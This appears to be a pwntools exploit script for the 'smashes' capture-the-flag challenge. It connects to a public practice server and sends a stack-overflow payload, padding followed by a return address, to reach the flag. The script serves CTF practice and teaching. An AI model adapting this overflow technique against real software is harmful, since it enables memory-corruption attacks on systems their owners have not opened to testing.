from pwn import *
p=process("smashes")
p=remote("pwn.jarvisoj.com",9877)
p.readuntil("name? ")
#gdb.attach(p,'b *0x00000000040087D')
payload="A".ljust(536,'\x00')+p64(0x400d21)
p.sendline(payload)
payload=''
p.sendlineafter("flag: ",payload)

p.interactive()
